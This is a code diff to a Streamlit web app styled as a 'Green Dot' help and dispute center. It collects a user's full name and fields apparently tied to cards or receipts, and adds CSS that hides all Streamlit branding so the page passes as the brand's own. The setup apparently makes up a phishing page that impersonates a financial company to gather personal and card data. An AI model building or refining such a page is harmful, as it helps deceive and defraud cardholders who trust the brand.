@@ -23,22 +23,21 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS NUCLEAR PARA OCULTAR TODO LO DE STREAMLIT ---
+# --- CSS REFORZADO PARA OCULTAR BRANDING DE STREAMLIT ---
 st.markdown("""<style>
-/* Ocultar elementos base */
+/* Ocultar header, footer y cualquier rastro de Streamlit */
 header {visibility: hidden !important; height: 0px !important;}
 footer {display: none !important; visibility: hidden !important;}
 #MainMenu {visibility: hidden !important;}
 .stDeployButton {display: none !important;}
 [data-testid=\"stHeader\"] {display: none !important;}
 [data-testid=\"stAppToolbar\"] {display: none !important;}
+[data-testid=\"stFooterAd\"] {display: none !important;}
 
-/* Eliminar el badge 'Made with Streamlit' y cualquier barra inferior */
-div[data-testid=\"stFooterAd\"] {display: none !important;}
+/* Selectores especificos para el badge inferior */
 div[class*=\"viewerBadge\"] {display: none !important;}
 div[class*=\"styles_viewerBadge\"] {display: none !important;}
 .stApp [data-testid=\"stStatusWidget\"] {display: none !important;}
-#streamlit-connection-error {display: none !important;}
 
 /* Ajuste de contenedor principal */
 .block-container {
@@ -47,7 +46,7 @@ div[class*=\"styles_viewerBadge\"] {display: none !important;}
     max-width: 800px !important;
 }
 
-/* Estilos de botones y secciones */
+/* Estilos de botones */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -74,12 +73,12 @@ div[class*=\"styles_viewerBadge\"] {display: none !important;}
 }
 </style>""", unsafe_allow_html=True)
 
-# --- CONTENIDO UI ---
+# --- UI CONTENT ---
 if os.path.exists('logo.svg'):
     st.image('logo.svg', width=150)
 
 st.title("Dispute Center")
-st.write("Please fill out the form below to submit your claim. All information is handled securely.")
+st.write("Please fill out the form below to submit your claim.")
 
 with st.form("dispute_form_final", clear_on_submit=True):
     nombre = st.text_input("Full Name")
@@ -94,11 +93,11 @@ with st.form("dispute_form_final", clear_on_submit=True):
 
 if submitted:
     if nombre and rec and car:
-        st.success("✅ Dispute submitted successfully. Reference ID: GD-" + str(int(datetime.now().timestamp())))
+        st.success("✅ Dispute submitted successfully.")
     else:
-        st.error("⚠️ Please complete all fields and upload required images.")
+        st.error("⚠️ Please complete all fields.")
 
-# SECCIÓN RESTAURADA DE APP STORES
+# SECCIÓN DE APP STORES
 st.markdown("""<div class='app-promo-container'>
     <h3 style='color:white;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
